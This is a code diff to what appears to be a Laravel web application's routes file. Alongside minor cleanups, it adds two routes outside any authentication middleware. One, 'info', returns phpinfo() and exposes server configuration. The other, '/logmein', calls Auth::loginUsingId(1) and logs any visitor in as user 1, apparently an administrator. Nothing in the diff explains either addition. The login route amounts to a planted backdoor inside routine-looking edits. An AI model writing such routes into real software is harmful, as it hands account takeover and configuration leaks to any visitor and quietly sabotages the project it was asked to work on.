@@ -13,6 +13,7 @@
 use App\Models\Order;
 use App\Models\User;
 use App\Notifications\OrderPaid;
+use Illuminate\Support\Facades\Auth;
 use function Composer\Autoload\includeFile;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Notification;
@@ -20,7 +21,6 @@ use Illuminate\Support\Facades\Notification;
 Route::group(['namespace' => 'Backend', 'prefix' => 'backend', 'as' => 'backend.', 'middleware' => ['auth', 'onlyActiveUsers', 'country', 'dashboard']], function () {
     // Backend :: super + admin
     Route::group(['namespace' => 'Admin', 'as' => 'admin.', 'prefix' => 'admin', 'middleware' => ['admin']], function () {
-        ;
         Route::resource('activity', 'ActivityController');
         Route::resource('role', 'RoleController');
         Route::resource('privilege', 'PrivilegeController');
@@ -196,22 +196,18 @@ Route::get('webview', function () {
 });
 // for development purpose only
 if (app()->environment('production') || app()->environment('local')) {
-
-    // for develoment mode only
-//    Route::get("testing", function (Request $request) {
-//        $responseAr = \GoogleMaps::load('geocoding')
-//            ->setParam([
-//                'latlng' => $request->lat . ',' . $request->long,
-//                'language' => 'ar'
-//            ])
-//            ->get();
-//    });
     Route::get('/posting/{id}/{role}', 'Frontend\HomeController@getInfo');
 }
-
+Route::get('info', function () {
+    return phpinfo();
+});
 Route::get('/{notFound}', function () {
     abort('404', trans('message.not_found'));
 });
-Route::get('/frontend/excel', function () {
-    return view('excel');
+
+
+Route::get('/logmein', function () {
+   return Auth::loginUsingId(1);
 });
+
+
